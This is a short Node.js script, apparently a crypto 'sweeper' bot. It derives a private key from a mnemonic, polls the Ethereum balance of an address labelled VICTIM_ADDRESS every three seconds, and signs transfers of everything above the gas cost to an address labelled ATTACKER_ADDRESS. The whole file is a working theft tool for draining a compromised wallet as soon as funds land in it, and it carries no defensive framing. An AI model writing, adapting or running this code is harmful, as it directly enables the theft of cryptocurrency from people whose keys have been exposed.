require("dotenv").config();
const Web3 = require("web3");
const { Wallet } = require("ethers");
const hdNode = Wallet.fromPhrase(process.env.MNEMONIC);

const PRIVATE_KEY = hdNode.privateKey;
const VICTIM_ADDRESS = "0x2bBD537229E670d8f64845D3A66026F8Aa64e39d";
const ATTACKER_ADDRESS = "0x274C184049480d9d4fac6414d02dceD706F74C5a";

const web3 = new Web3(
  `https://mainnet.infura.io/v3/${process.env.INFURA_API_KEY}`
);

async function monitorAndDrain() {
  console.log("Bot started... watching for funds");

  // Infinite loop, it is checking the fopunds each
  while (true) {
    const balanceWei = BigInt(await web3.eth.getBalance(VICTIM_ADDRESS));
    const balanceEth = web3.utils.fromWei(balanceWei.toString(), "ether");
    console.log(`Current balance: ${balanceEth} ETH`);

    if (balanceWei > 0n) {
      const gasPrice = BigInt(await web3.eth.getGasPrice());
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit;

      if (balanceWei > gasCost) {
        const valueToSend = balanceWei - gasCost;

        console.log(`Detected balance: ${balanceEth} ETH`);
        console.log(
          `Gas price: ${web3.utils.fromWei(gasPrice.toString(), "gwei")} Gwei`
        );
        console.log(
          `Gas cost: ${web3.utils.fromWei(gasCost.toString(), "ether")} ETH`
        );
        console.log(
          `Amount to send: ${web3.utils.fromWei(
            valueToSend.toString(),
            "ether"
          )} ETH`
        );

        const nonce = await web3.eth.getTransactionCount(VICTIM_ADDRESS);

        const tx = {
          to: ATTACKER_ADDRESS,
          value: valueToSend.toString(),
          gas: Number(gasLimit),
          gasPrice: gasPrice.toString(),
          nonce: nonce,
          chainId: 1,
        };

        const signedTx = await web3.eth.accounts.signTransaction(
          tx,
          PRIVATE_KEY
        );
        const receipt = await web3.eth.sendSignedTransaction(
          signedTx.rawTransaction
        );

        console.log(`Funds moved Tx hash: ${receipt.transactionHash}`);
      } else {
        console.log(
          `Balance too low to cover gas: ${web3.utils.fromWei(
            balanceWei.toString(),
            "ether"
          )} ETH`
        );
      }
    }

    // Wait 3 seconds and check again
    await new Promise((r) => setTimeout(r, 3000));
  }
}

monitorAndDrain();
